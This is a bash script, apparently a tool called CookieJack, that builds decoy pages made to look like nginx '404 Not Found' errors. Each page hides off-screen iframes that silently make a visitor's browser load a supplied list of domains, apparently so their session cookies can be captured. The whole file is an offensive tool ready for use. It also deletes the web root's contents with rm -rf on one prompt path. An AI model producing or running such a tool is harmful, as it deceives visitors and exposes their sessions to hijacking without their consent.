#!/usr/bin/env bash

## ToDo:
## Deal with absolute directory for $1

envir--()
{
wrn="\033[31m"   ## Warnings / Infinite Loops
ins="\033[1;32m" ## Instructions
out="\033[1;33m" ## Outputs
hdr="\033[1;34m" ## Headers
inp="\033[36m"   ## Inputs
wtf="\033[34m"   ## WTFs
rst="\e[0m"      ## Reset
current_ver=0.4
rel_date="20 November 2014"
launch_dir=$(pwd)
}

envir--

if [[ -z $1 ]]; then
	echo -e "$wrn\nYou must provide a list of domains for the first argument"
	echo -e "$ins\nExample: CookieJack.sh list.lst$rst "
	exit 1
fi

echo -e "$inp\nWhat is your IP address?$rst "
read ip
root="/var/www"
echo -e "$inp\n$root is the webserver root? (y or n)$rst "
read val
case $val in
	n|N) echo -e "$inp\nLocation?\nDO NOT END WITH A /$rst "
	read root ;;
esac

mkdir -p $root

## Check for previously existing files
cd $root
if [[ -z "$(ls -A)" ]]; then
	empty=1
fi

if [[ $empty -ne 1 ]]; then
	echo -e "$wrn\n$root contains files, would you like them archived? (y or n)$rst "
	read archive_me
	case $archive_me in
		y|Y) archive_me=1 ;;
		n|N) echo -e "$ins\nPress 1 to quit, Enter to continue$rst "
		read kill
		if [[ $kill -eq 1 ]]; then
			exit 0
		else
			rm -rf $root/*
		fi ;;
	esac

	if [[ $archive_me -eq 1 ]]; then
		mkdir -p archived_$$
		mv * archived_$$ > /dev/null 2>&1
	fi
fi

cd $launch_dir

## Set first argument to be the input
list=$1

## Remove all empty lines from input
sed -i '/^$/d' $list

## Give index.html our first local file to browse to
read begin < $list

## Make $list parsable via for
list=$(cat $1)

## Our counter value to increase speed of loading URLs
x=1

## Build index.html
echo "<html>
	<head><title>404 Not Found</title></head>
	<body bgcolor=\"white\">
	<center><h1>404 Not Found</h1></center>
	<hr><center>nginx/1.4.6 (CentOS)</center>
	<div style=\"position:absolute;top:-9999px;left:-9999px;visibility:collapse;\">
		<iframe src=\"http://$ip/$begin.html\"></iframe>
	</div></body>
</html>" > $root/index.html

## HTML file builder
for i in $list; do
	echo "<html>
	<head><title>404 Not Found</title></head>
	<body bgcolor=\"white\">
	<center><h1>404 Not Found</h1></center>
	<hr><center>nginx/1.4.6 (CentOS)</center>
	<div style=\"position:absolute;top:-9999px;left:-9999px;visibility:collapse;\">" > $root/$i.html

	## Grab the next domain
	let x++
	next=$(awk "NR==$x{print;exit}" $1)

	## Loading of the next page prior to loading the URL itself is VERY quick
	echo "		<iframe src=\"http://$ip/$next.html\"></iframe>
		<iframe src=\"http://$i\"></iframe>
	</div></body>
</html>" >> $root/$i.html
done

## Remove .html from last domain file
x=$(tail -n 1 $1)
head -n 6 $root/$x.html > $root/tmp
tail -n 3 $root/$x.html >> $root/tmp
mv -f $root/tmp $root/$x.html

echo -e "$out\nDone!$ins
If there were previous files in $root, they were saved to $out$root/archived_$$$rst\n"
